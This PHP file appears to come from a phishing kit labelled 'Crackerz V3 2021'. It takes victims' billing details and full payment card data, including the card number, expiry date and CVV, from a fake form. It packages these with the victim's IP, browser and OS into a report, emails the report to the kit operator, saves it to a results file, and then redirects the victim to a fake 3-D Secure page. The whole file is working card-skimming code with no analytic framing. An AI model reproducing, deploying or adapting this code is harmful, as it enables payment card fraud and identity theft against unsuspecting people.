<?php

	session_start();
	error_reporting(E_ERROR | E_PARSE);

	include('../anti/anti.php');
	include('../config/config.php');
	include('../include/get_lg.php');
	include('../include/get_os.php');
	include('../../hash.php');

	//BILLING
	$_SESSION['xyscountryx'] = $_POST['xyscountryx'];
	$_SESSION['xysidchoicex'] = $_POST['xysidchoicex'];
	$_SESSION['xysidx'] = $_POST['xysidx'];
	$_SESSION['xysfullnamex'] = $_POST['xysfullnamex'];
	$_SESSION['xysaddressx'] = $_POST['xysaddressx'];
	$_SESSION['xyscityx'] = $_POST['xyscityx'];
	$_SESSION['xysposcodex'] = $_POST['xysposcodex'];
	$_SESSION['xysphonetypex'] = $_POST['xysphonetypex'];
	$_SESSION['xysphonex'] = $_SESSION['xcountryPhonePrefixx'].$_POST['xysphonex'];
	
	//CARDING
	$_SESSION['xyscardholderx'] = $_POST['xyscardholderx'];
	$_SESSION['xyscardnumberx'] = $_POST['xyscardnumberx'];
	$_SESSION['xysexpirydatex'] = $_POST['xysexpirydatex'];
	$_SESSION['xyscvvx'] = $_POST['xyscvvx'];
	$_SESSION['xyscscx'] = $_POST['xyscscx'];

	if (empty(trim($_SESSION['xyscvvx']))) {
		$_SESSION['xyscvvx'] = '--';
	}

	if (empty(trim($_SESSION['xyscscx']))) {
		$_SESSION['xyscscx'] = '--';
	}

	$xysmsgx = '<!DOCTYPE html>
	<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Result</title>
		<style type="text/css">
	* { margin: 0; font-family: Orbitron, verdana; font-size: 13px; }
	.content {
		background: #f6f6f6;
	    max-width: 800px;
	    margin: auto;
	}
	.container {
		background: whitesmoke;
	    padding-top: 40px;
	}
	.box .header {
		background-color: #2980b9;
	    font-weight: bold;
	    color: white;
	}
	.box {
	    border-radius: 8px;
	    border: 2px solid #2980b9;
	    box-shadow: inset 0 1px 1px rgba(0,0,0,.075), 0 0 18px #2980b9;
	    background: #f6f6f6;
	}
	.box .dhead {
		    display: inline-block;
	    width: 30%;
	}
	.box .data {
		display: inline-block;
	    width: 68%;
	}
	.box .infos, .box .header, .box .infosvic {
		padding: 6px 12px;
	}
	.box .infosvic {
	    border-top: 1px solid #2980b9;
	}
	.box .infosvic div {
	    color: #b7b7b7;
	}
	.box .infos div {
		margin: 3px 0;
	}
	</style>
	</head>
	<body>
		<div class="container">
		<div class="content">
			<div class="box">
				<div class="header">
					<div class="dhead">BILLING & CARDING</div>
					<div class="data">Crackerz V3 2021</div>
				</div>
				<div class="infos">
					<div class="dhead">Country:</div>
					<div class="data">'.$_SESSION['xyscountryx'].'</div><br>
					<div class="dhead">'.$_SESSION['xysidchoicex'].'</div>
					<div class="data">'.$_SESSION['xysidx'].'</div><br>
					<div class="dhead">Full name:</div>
					<div class="data">'.$_SESSION['xysfullnamex'].'</div><br>
					<div class="dhead">Address:</div>
					<div class="data">'.$_SESSION['xysaddressx'].'</div><br>
					<div class="dhead">City:</div>
					<div class="data">'.$_SESSION['xyscityx'].'</div><br>
					<div class="dhead">Postal Code:</div>
					<div class="data">'.$_SESSION['xysposcodex'].'</div><br>
					<div class="dhead">'.$_SESSION['xysphonetypex'].'</div>
					<div class="data">'.$_SESSION['xysphonex'].'</div><br>
					<div class="dhead">Card Holder:</div>
					<div class="data">'.$_SESSION['xyscardholderx'].'</div><br>
					<div class="dhead">Card Number:</div>
					<div class="data">'.$_SESSION['xyscardnumberx'].'</div><br>
					<div class="dhead">Expiration Date:</div>
					<div class="data">'.$_SESSION['xysexpirydatex'].'</div><br>
					<div class="dhead">CVV:</div>
					<div class="data">'.$_SESSION['xyscvvx'].'</div><br>
					<div class="dhead">CSC (FOR AMEX):</div>
					<div class="data">'.$_SESSION['xyscscx'].'</div><br>
				</div>
				<div class="infosvic">
					<div class="dhead">IP-GEO:</div>
					<div class="data">http://www.geoiptool.com/?IP='.$_SESSION['xipx'].'</div><br>
					<div class="dhead">Browser:</div>
					<div class="data">'.$_SESSION['xbrowserx'].'</div><br>
					<div class="dhead">OS:</div>
					<div class="data">'.$_SESSION['xosx'].'</div><br>
					<div class="dhead">DateTime:</div>
					<div class="data">'.$DATE.'</div>
				</div>
			</div>
		</div>
	</div>
	</body>
	</html>';

	$xsubx = "BILLING & CARDING | [".$_SESSION['xcountryx']."] | [".$_SESSION['xipx']."] ";
	$xheadx = "MIME-Version: 1.0" . "\r\n";
	$xheadx .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	$xheadx .= "From: " . $sp_name . "<crn@cgiwebps.nl>" . "\r\n";
	
	mail($send_email, $xsubx, $xysmsgx, $xheadx);

	if($save_result){
		$f = fopen("../../result/".$savefile_name, "a+");
	    fwrite($f, $xysmsgx);
	    fclose($f);
	}

	$xDIRx = "3ds.php?country.x=".$countryCode."&locale.x=".getLG($countryCode)."_".$countryCode."&customer.x=ID-PA".$hash."&safety=".$hash2;
	echo '<meta http-equiv="refresh" content="0; URL=../'.$xDIRx.'" />';
	
?>